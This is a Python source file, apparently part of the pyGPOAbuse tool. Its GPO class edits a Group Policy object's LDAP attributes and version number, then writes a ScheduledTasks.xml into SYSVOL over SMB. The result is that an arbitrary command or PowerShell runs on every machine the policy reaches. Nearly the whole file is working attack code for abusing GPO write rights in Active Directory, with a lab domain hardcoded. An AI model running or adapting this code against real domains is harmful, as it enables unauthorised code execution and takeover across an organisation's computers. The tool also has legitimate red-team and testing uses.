import asyncio
import logging
import re
from msldap.commons.url import MSLDAPURLDecoder
from msldap.ldap_objects import MSADGPO
from pygpoabuse.scheduledtask import ScheduledTask


class GPO:
    def __init__(self, smb_session):
        self._smb_session = smb_session

    async def client(self, url, gpo_id):
        dn = 'CN={' + gpo_id + '},CN=Policies,CN=System,DC=hackn,DC=lab'
        conn_url = MSLDAPURLDecoder(url)
        ldap_client = conn_url.get_client()
        _, err = await ldap_client.connect()
        if err is not None:
            raise err

        async for gpo in ldap_client.get_object_by_dn(dn, expected_class=MSADGPO):
            gPCMachineExtensionNames = gpo.gPCMachineExtensionNames
            versionNumber = gpo.versionNumber

            updated_gPCMachineExtensionNames = self.update_gPCMachineExtensionNames(gPCMachineExtensionNames)
            updated_versionNumber = versionNumber + 1

            _, err = await ldap_client.modify_object_by_dn(dn, {
                'gPCMachineExtensionNames': [('replace', [updated_gPCMachineExtensionNames])],
                'versionNumber': [('replace', [updated_versionNumber])],
            })
            if err is not None:
                raise err

            return updated_versionNumber

    def update_gPCMachineExtensionNames(self, gPCMachineExtensionNames):
        val1 = "00000000-0000-0000-0000-000000000000"
        val2 = "CAB54552-DEEA-4691-817E-ED4A4D1AFC72"
        val3 = "AADCED64-746C-4633-A97C-D61349046527"

        try:
            if not val2 in gPCMachineExtensionNames:
                new_values = []
                toUpdate = gPCMachineExtensionNames
                test = toUpdate.split("[")
                for i in test:
                    new_values.append(i.replace("{", "").replace("}", " ").replace("]", ""))

                if val1 not in toUpdate:
                    new_values.append(val1 + " " + val2)

                elif val1 in toUpdate:
                    for k, v in enumerate(new_values):
                        if val1 in new_values[k]:
                            toSort = []
                            test2 = new_values[k].split()
                            for f in range(1, len(test2)):
                                toSort.append(test2[f])
                            toSort.append(val2)
                            toSort.sort()
                            new_values[k] = test2[0]
                            for val in toSort:
                                new_values[k] += " " + val

                if val3 not in toUpdate:
                    new_values.append(val3 + " " + val2)

                elif val3 in toUpdate:
                    for k, v in enumerate(new_values):
                        if val3 in new_values[k]:
                            toSort = []
                            test2 = new_values[k].split()
                            for f in range(1, len(test2)):
                                toSort.append(test2[f])
                            toSort.append(val2)
                            toSort.sort()
                            new_values[k] = test2[0]
                            for val in toSort:
                                new_values[k] += " " + val

                new_values.sort()

                new_values2 = []
                for i in range(len(new_values)):
                    if new_values[i] is None or new_values[i] == "":
                        continue
                    value1 = new_values[i].split()
                    new_val = ""
                    for q in range(len(value1)):
                        if value1[q] is None or value1[q] == "":
                            continue
                        new_val += "{" + value1[q] + "}"
                    new_val = "[" + new_val + "]"
                    new_values2.append(new_val)

                return "".join(new_values2)
        except:
            return "[{" + val1 + "}{" + val2 + "}]" + "[{" + val3 + "}{" + val2 + "}]"

    def update_versions(self, url, domain, gpo_id):
        versionNumber = asyncio.run(self.client(url, gpo_id))

        if not versionNumber:
            logging.error("Unable to update LDAP object")
            return False

        logging.debug("Updated version number : {}".format(versionNumber))

        try:
            tid = self._smb_session.connectTree("SYSVOL")
            fid = self._smb_session.openFile(tid, domain + "/Policies/{" + gpo_id + "}/gpt.ini")
            content = self._smb_session.readFile(tid, fid)

            new_content = re.sub('=[0-9]+', '={}'.format(versionNumber), content.decode("utf-8"))
            self._smb_session.writeFile(tid, fid, new_content)
            self._smb_session.closeFile(tid, fid)
        except:
            logging.error("Unable to update gpt.ini file", exc_info=True)
            return False
        logging.debug("gpt.ini file successfully updated")
        return True

    def _check_or_create(self, base_path, path):
        for dir in path.split("/"):
            base_path += dir + "/"
            try:
                self._smb_session.listPath("SYSVOL", base_path)
                logging.debug("{} exists".format(base_path))
            except:
                try:
                    self._smb_session.createDirectory("SYSVOL", base_path)
                    logging.debug("{} created".format(base_path))
                except:
                    logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
                    return False
        return True

    def update_scheduled_task(self, domain, gpo_id, name="", mod_date="", description="", powershell=False, command="", force=False):

        try:
            tid = self._smb_session.connectTree("SYSVOL")
            logging.debug("Connected to SYSVOL")
        except:
            logging.error("Unable to connect to SYSVOL share", exc_info=True)
            return False

        path = domain + "/Policies/{" + gpo_id + "}/"

        try:
            self._smb_session.listPath("SYSVOL", path)
            logging.debug("GPO id {} exists".format(gpo_id))
        except:
            logging.error("GPO id {} does not exist".format(gpo_id), exc_info=True)
            return False

        if not self._check_or_create(path, "Machine/Preferences/ScheduledTasks"):
            return False

        path += "Machine/Preferences/ScheduledTasks/ScheduledTasks.xml"

        try:
            fid = self._smb_session.openFile(tid, path)
            if not force:
                logging.error(
                    "The GPO already includes a ScheduledTasks.xml. Use -f to append to ScheduledTasks.xml or choose another GPO")
                return False
            st_content = self._smb_session.readFile(tid, fid, singleCall=False).decode("utf-8")
            st = ScheduledTask(name=name, mod_date=mod_date, description=description, powershell=powershell, command=command, old_value=st_content)
            new_content = st.generate_scheduled_task_xml()
        except Exception as e:
            # File does not exist
            logging.debug("ScheduledTasks.xml does not exist. Creating it...")
            try:
                fid = self._smb_session.createFile(tid, path)
                logging.debug("ScheduledTasks.xml created")
            except:
                logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
                return False
            st = ScheduledTask(name=name, mod_date=mod_date, description=description, powershell=powershell, command=command)
            new_content = st.generate_scheduled_task_xml()

        try:
            self._smb_session.writeFile(tid, fid, new_content)
            logging.debug("ScheduledTasks.xml has been saved")
        except:
            logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
            self._smb_session.closeFile(tid, fid)
            return False
        self._smb_session.closeFile(tid, fid)
        return st.get_name()